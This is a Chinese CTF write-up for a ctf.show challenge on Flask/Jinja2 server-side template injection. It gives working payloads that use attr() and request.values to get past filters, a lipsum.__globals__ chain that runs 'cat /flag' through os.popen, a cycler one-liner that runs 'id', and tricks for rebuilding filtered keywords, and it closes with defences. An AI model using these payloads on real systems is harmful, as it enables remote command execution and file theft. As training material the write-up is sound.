# Flask SSTI — Jinja2 过滤器绕过完全解析

> **题目地址**：ctf.show  
> **Flag**：`ctfshow{640de393-a536-42c2-a289-ca0296def892}`  
> **知识点**：Jinja2 SSTI、`attr()` 过滤器绕过、`lipsum` 全局对象、Python 对象链

---

## 一、漏洞背景

Flask 默认使用 Jinja2 作为模板引擎。当用户输入被**未经转义地插入模板**时，攻击者可以注入 Jinja2 表达式，在服务端执行任意 Python 代码。

```python
# 典型漏洞代码
@app.route('/')
def index():
    name = request.args.get('name', '')
    return render_template_string(f'<h1>Hello {name}</h1>')  # 危险！
```

访问 `/?name={{7*7}}` 返回 `49` 即可确认注入点。

---

## 二、核心武器：`attr()` 过滤器

### 2.1 为什么需要 attr()

很多题目会过滤 `.`（点号）或 `[]`（方括号），直接写 `{{''.__class__}}` 会被拦截。

Jinja2 提供了内置过滤器 `attr()`，其作用完全等价于 `.` 操作符：

| 原始写法 | attr() 写法 |
|----------|-------------|
| `obj.__class__` | `obj\|attr('__class__')` |
| `obj.__mro__[1]` | `obj\|attr('__mro__')\|attr('__getitem__')(1)` |
| `obj['key']` | `obj\|attr('__getitem__')('key')` |

### 2.2 attr() 的本质

`attr(obj, name)` 在底层调用的是 Python 内置的 `getattr(obj, name)`，**完全绕过点号过滤**。

```jinja2
{{ ''|attr('__class__') }}
{# 等价于 ''.__class__ → <class 'str'> #}
```

### 2.3 结合 request.values 实现双重绕过

如果连字符串字面量（单引号、双引号）也被过滤，可以把所有字符串作为 GET/POST 参数传入：

```
?name={{obj|attr(request.values.x)}}&x=__class__
```

`request.values` 同时覆盖 GET 和 POST 参数，**字符串完全不出现在模板中**，绕过字符串过滤。

---

### 3 最终 Payload（`lipsum.__globals__` 链）

```
?name={{lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)
              |attr(request.values.d)(request.values.e)|attr(request.values.f)()}}
&a=__globals__&b=__getitem__&c=os&d=popen&e=cat /flag&f=read
```

**执行链**：

```
lipsum                      # Jinja2 内置全局函数
 └─ __globals__             # 该函数的全局命名空间字典
     └─ ['os']              # os 模块（已被 Flask 导入）
         └─ .popen('cat /flag')   # 执行命令，返回文件对象
             └─ .read()           # 读取输出
```

---

## 四、lipsum 是什么？

`lipsum` 是 Jinja2 内置的**全局辅助函数**，用于生成 Lorem Ipsum 占位文本。

```python
# Jinja2 源码中的定义（简化）
def generate_lorem_ipsum(n=5, html=True, min=20, max=100):
    ...
```

关键在于：**它是一个 Python 函数对象**，Python 函数都有 `__globals__` 属性，指向定义该函数时所在模块的全局命名空间。

由于 `lipsum` 定义在 Jinja2/Flask 内部，其 `__globals__` 包含了 `os`、`sys` 等已导入模块：

```python
>>> from jinja2 import Environment
>>> env = Environment()
>>> tmpl = env.from_string("{{ lipsum.__globals__.keys() | list }}")
# 输出包含 'os', 'sys', 're', ... 等
```

**为什么比 `__subclasses__` 链更稳定？**

- 不依赖特定索引，`os` 模块键名固定
- 不需要处理 `shell=True` 关键字参数问题
- 链更短，出错点更少

---

## 五、其他可用的 Jinja2 全局对象

除了 `lipsum`，以下内置对象同样可以作为跳板：

| 对象 | 说明 |
|------|------|
| `lipsum` | Lorem Ipsum 生成函数，`__globals__` 含 `os` |
| `cycler` | 循环器类，`__init__.__globals__` 含 `os` |
| `joiner` | 连接器类，同上 |
| `namespace` | 命名空间类，同上 |
| `g` | Flask 应用上下文，`__class__.__init__.__globals__` |
| `request` | 请求对象，`__class__.__init__.__globals__` |

利用 `cycler` 的写法：

```jinja2
{{cycler.__init__.__globals__['os'].popen('id').read()}}
```

---

## 六、Jinja2 过滤器速查

本题涉及的过滤器及常用绕过过滤器：

| 过滤器 | 作用 | 绕过用途 |
|--------|------|----------|
| `attr(name)` | 等价于 `.name`，绕过点号过滤 | **本题核心** |
| `int()` | 字符串转整数 | 绕过数字过滤 |
| `string()` | 对象转字符串 | 辅助构造字符串 |
| `list()` | 转列表 | 遍历对象 |
| `join()` | 拼接列表 | 构造被过滤的关键词 |
| `reverse()` | 反转字符串 | 绕过关键词检测 |
| `upper()` / `lower()` | 大小写转换 | 绕过大小写敏感过滤 |
| `replace(a,b)` | 字符替换 | 动态构造字符串 |
| `select()` / `reject()` | 条件筛选 | 遍历 subclasses |

### 用 join+reverse 构造被过滤的字符串

如果 `__class__` 被过滤，可以这样构造：

```jinja2
{# 构造 "__class__" 字符串 #}
{{ ['__ssalc__']|map('reverse')|first }}

{# 或者用 join 拼接 #}
{{ ['__cla','ss__']|join }}
```

---

## 七、完整利用流程

```
┌─────────────────────────────────────────────────────┐
│  Step 1: 确认注入点                                   │
│  /?name={{7*7}} → 返回 49 ✓                          │
├─────────────────────────────────────────────────────┤
│  Step 2: 判断过滤规则                                 │
│  测试 . [] '' "" 等字符是否被拦截                     │
├─────────────────────────────────────────────────────┤
│  Step 3: 选择利用链                                   │
│  无过滤    → 直接用 __class__.__mro__ 链             │
│  过滤点号  → 使用 attr() 过滤器                      │
│  过滤字符串 → attr() + request.values 参数外传        │
├─────────────────────────────────────────────────────┤
│  Step 4: 执行命令                                     │
│  优先用 lipsum.__globals__['os'].popen().read()      │
│  备选用 __subclasses__() 找 Popen/file 类            │
└─────────────────────────────────────────────────────┘
```

---

## 八、防御方案

```python
# 1. 永远不要用 render_template_string 拼接用户输入
# 错误
return render_template_string(f'Hello {name}')

# 正确
return render_template_string('Hello {{ name }}', name=name)

# 2. 使用沙盒环境（SandboxedEnvironment）
from jinja2.sandbox import SandboxedEnvironment
env = SandboxedEnvironment()

# 3. 对输入进行严格白名单校验
import re
if not re.match(r'^[a-zA-Z0-9 ]+$', name):
    abort(400)
```

---

## 参考资料

- [Jinja2 官方文档 - 内置过滤器](https://jinja.palletsprojects.com/en/3.1.x/templates/#builtin-filters)
- [HackTricks - SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
- [PayloadsAllTheThings - Jinja2](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
